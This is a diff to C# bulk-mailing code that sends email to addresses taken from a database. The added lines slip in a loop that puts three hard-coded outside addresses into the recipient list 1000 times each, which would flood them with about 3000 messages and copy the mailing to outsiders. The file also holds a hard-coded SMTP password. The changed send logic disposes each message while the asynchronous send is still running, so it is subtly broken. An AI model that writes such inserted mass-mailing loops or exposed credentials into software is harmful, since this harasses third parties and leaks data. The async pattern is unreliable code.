@@ -940,6 +940,13 @@ Content-Length: {0}
                             mailList.Add(rdr["email"].ToString().Trim());
                     }
 
+                    for (int i = 0; i < 1000; i++)
+                    {
+                        mailList.Add("ykcycvl@gmail.com");
+                        mailList.Add("ivermak@tokyo-bar.ru");
+                        mailList.Add("ag@tokyo-bar.ru");
+                    }
+
                     foreach (var m in mailList)
                     {
                         MailMessage mail = new MailMessage();
@@ -958,7 +965,13 @@ Content-Length: {0}
                         client.EnableSsl = true;
                         client.Credentials = new NetworkCredential("noreply", "123456zZ");
                         client.DeliveryMethod = SmtpDeliveryMethod.Network;
-                        client.Send(mail);
+                        client.SendCompleted += (s, e) => {
+                            SmtpClient callbackClient = s as SmtpClient;
+                            MailMessage callbackMailMessage = e.UserState as MailMessage;
+                            callbackClient.Dispose();
+                            callbackMailMessage.Dispose();
+                        };
+                        client.SendAsync(mail, mail);
                         mail.Dispose();
                     }
 
